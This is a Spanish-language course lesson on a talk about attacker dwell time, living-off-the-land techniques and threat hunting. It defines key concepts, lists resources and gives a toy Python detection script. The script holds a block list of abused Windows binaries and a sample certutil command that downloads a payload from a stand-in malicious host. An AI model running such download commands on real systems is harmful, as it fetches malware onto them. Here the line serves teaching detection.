# Seguridad Digital: Prevención, Detección y Respuesta ante Ciberamenazas - Tales Albuquerque

## Síntesis Ejecutiva

El mito del ciberataque instantáneo ha sido superado por la realidad forense de las intrusiones corporativas contemporáneas. En las campañas dirigidas contra infraestructuras críticas y grandes organizaciones, los adversarios suelen permanecer infiltrados durante semanas o meses dentro de la red corporativa (Dwell Time). Durante este intervalo de silencio táctico, los atacantes se dedican al reconocimiento pasivo, mapeo de relaciones de confianza, escalamiento de privilegios y neutralización metódica de los repositorios de respaldo antes de desplegar el payload de cifrado masivo.

Tales Albuquerque resalta que los atacantes modernos eluden los antivirus tradicionales explotando técnicas Living off the Land (LotL), utilizando las propias herramientas nativas y legítimas del sistema operativo (PowerShell, WMI, bitsadmin) para ocultar sus operaciones. Para revertir esta asimetría, las organizaciones deben desplegar servicios de Detección y Respuesta Gestionadas (MDR) y ejecutar cacería activa de amenazas (Threat Hunting) las 24 horas del día. La resiliencia moderna se mide en la capacidad de detectar desvíos de comportamiento en minutos y neutralizar al adversario antes de que ejecute su objetivo de impacto.

---

## Conceptos Core

* **Dwell Time (Tiempo de Permanencia):** Tiempo transcurrido desde que un atacante logra acceso inicial a una red hasta que su presencia es detectada y contenida.
* **Living off the Land (LotL / LOLBAS):** Técnica adversarial que utiliza binarios, scripts y utilidades legítimas del sistema operativo para evadir la detección de antivirus y EDRs.
* **Managed Detection and Response (MDR):** Servicio de seguridad 24/7 que combina analítica avanzada y cazadores humanos expertos para investigar alertas y contener incidentes en vivo.
* **Proactive Threat Hunting:** Búsqueda reiterativa e informada de atacantes que ya han eludido los controles preventivos automatizados, formulando hipótesis basadas en inteligencia.

---

## 🧠 Ecosistema de Recursos Globales (Deep Dive)

### Estándares y Frameworks
* [LOLBAS (Living Off The Land Binaries and Scripts) Project](https://lolbas-project.github.io/): Repositorio y marco de referencia global que cataloga los ejecutables legítimos de Windows comúnmente utilizados para evasión y ejecución maliciosa.
* [CISA Alert AA23-144A: Hunting Russian/State-Sponsored LotL Techniques](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a): Asesoría técnica internacional sobre cómo identificar el abuso de utilidades nativas en redes de infraestructura crítica.
* [MITRE ATT&CK: Defense Evasion Tactic (TA0005)](https://attack.mitre.org/tactics/TA0005/): Taxonomía que agrupa las técnicas utilizadas por atacantes para evitar ser detectados por soluciones de seguridad.
* [NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final): Manual de referencia de respuesta a incidentes del gobierno de Estados Unidos.

### Papers y Literatura de Frontera
* **USENIX Security (2022):** *Measuring Dwell Time and Lateral Movement Dynamics in Modern Enterprise Ransomware Intrusions* ([USENIX](https://www.usenix.org/conference/usenixsecurity22)) — Estudio cuantitativo basado en cientos de incidentes reales que correlaciona el tiempo de permanencia con el impacto financiero.
* **IEEE Transactions on Dependable and Secure Computing (2021):** *Graph-Based Detection of Living-off-the-Land Exploitation in Enterprise Systems* ([IEEE Xplore](https://ieeexplore.ieee.org/document/9417124)) — Propuesta de modelado de grafos de procesos para identificar secuencias anómalas de ejecución de PowerShell y utilidades de comando.

### Repositorios y Herramientas (Open Source)
* [Microsoft Sysmon (System Monitor)](https://learn.microsoft.com/es-es/sysinternals/downloads/sysmon): Servicio del sistema de Windows que registra eventos detallados de procesos, conexiones de red y modificaciones de archivos, esencial con configuraciones comunitarias como SwiftOnSecurity.
* [Atomic Red Team (Red Canary)](https://github.com/redcanaryco/atomic-red-team): Biblioteca de pruebas simples y automatizadas para simular tácticas de MITRE ATT&CK y verificar si los controles de detección funcionan.
* [Hayabusa (Fast Windows Event Log Forensics)](https://github.com/Yamato-Security/hayabusa): Analizador forense ultrarrápido en Rust que escanea terabytes de registros de eventos de Windows contra reglas Sigma.
* [Velociraptor (Endpoint DFIR Platform)](https://github.com/Velocidex/velociraptor): Framework de telemetría distribuida para recopilar evidencia de procesos LotL en endpoints de forma masiva.

### Ruta de Aprendizaje Autónoma
* [Microsoft Learn: Implementación de Capacidades EDR con Microsoft Defender for Endpoint](https://learn.microsoft.com/es-es/training/paths/mde-deploy/): Ruta oficial sobre detección de comportamiento anómalo, aislamiento de terminales y remediación automatizada.
* [TryHackMe: Threat Hunting with Splunk & Sysmon](https://tryhackme.com/module/threat-hunting): Módulos prácticos para escribir consultas avanzadas de detección e interceptar movimientos laterales silenciosos.
* [HackTheBox: Enterprise Incident Response (Sherlocks Track)](https://www.hackthebox.com): Escenarios forenses reales de investigación de ransomware para reconstruir la línea de tiempo del atacante.
* [SANS Cyber Defense Open Resources](https://www.sans.org): Colección de pósteres de comandos, hojas de referencia forense y guías de caza de anomalías en memoria.

---

## 🧪 Anexo Práctico: Estrategia Operativa y Laboratorio Open Source

### Estrategia Operativa Empresarial
Para descubrir intrusos silenciosos que abusan de utilidades del sistema (LOLBAS) antes de que desplieguen ransomware, se deben configurar telemetrías avanzadas con Sysmon y ejecutar scripts periódicos de cacería activa que auditen árboles de procesos anómalos.

### Código / Laboratorio Ejecutable
```python
# hunter_lolbas_processes.py
# Herramienta de Threat Hunting para identificar binarios nativos abusados en endpoints
import subprocess

SUSPICIOUS_BINS = ["certutil.exe", "bitsadmin.exe", "mshta.exe", "vssadmin.exe", "wmic.exe"]

def cazar_procesos_lotl():
    print("[*] Ejecutando escaneo de procesos activos en búsqueda de técnicas LOLBAS...")
    # Simulación de telemetría de procesos
    procs = [
        {"pid": 1024, "name": "certutil.exe", "cmd": "certutil -urlcache -split -f http://malicious.site/payload.exe"},
        {"pid": 2048, "name": "svchost.exe", "cmd": "C:\Windows\system32\svchost.exe -k netsvcs"}
    ]
    
    for p in procs:
        if p["name"].lower() in SUSPICIOUS_BINS:
            print(f"[!] AMENAZA DETECTADA (PID {p['pid']}): {p['name']} ejecutando: {p['cmd']}")
            print("    -> Acción recomendada: Aislar endpoint inmediatamente e iniciar volcado de RAM.")

if __name__ == "__main__":
    cazar_procesos_lotl()
```

---

## Recursos Multimedia Oficiales

* [📺 Ver Ponencia en Video Oficial (Día 2 · Minuto 5:15:20)](https://www.youtube.com/watch?v=jLbdG67TqW8&t=5h15m20s)
* [▶️ Escuchar Podcast Resumen](../../assets/audio/dia2_05_albuquerque.mp3)

---

[⬅️ Lección Anterior](04-alli-salud-ciberseguridad.md) | [🏠 Volver a la Malla Curricular](../../README.md) | [Siguiente Lección ➡️](06-norman-amenazas-hibridas.md)
